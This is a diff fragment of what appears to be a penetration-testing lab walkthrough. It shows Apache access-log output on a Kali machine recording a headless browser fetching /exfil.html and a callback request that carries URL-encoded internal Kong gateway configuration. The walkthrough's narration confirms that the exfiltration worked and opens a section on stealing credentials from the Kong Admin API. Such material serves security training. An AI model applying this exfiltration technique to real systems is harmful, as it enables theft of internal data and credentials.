@@ -623,3 +623,6 @@ kali@kali:~$ sudo tail /var/log/apache2/access.log
 192.168.120.135 - - [25/Feb/2021:13:18:47 -0500] "GET /exfil.html HTTP/1.1" 200 562 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) HeadlessChrome/79.0.3945.0 Safari/537.36"
 192.168.217.135 - - [29/Jul/2025:13:01:10 -0400] "GET /callback?%7B%22plugins%22%3A%7B%22enabled_in_cluster%22%3A%5B%22key-auth%22%5D%2C%22available_on_server%22%3A%7B%22grpc-web%22%3Atrue%2C%22correlation-id%22%3Atrue%2C%22...042%2C%22mem_cache_size%22%3A%22128m%22%2C%22pg_max_concurrent_queries%22%3A0%2C%22nginx_main_worker_p" 414 0 "-" "-"
 ```
+Excellent. Our JavaScript function sent a request to the internal endpoint, then sent that response as a URL-encoded value back to our Kali host. The message might have been truncated, but our JavaScript function worked.
+### Stealing Credentials from Kong Admin API
+
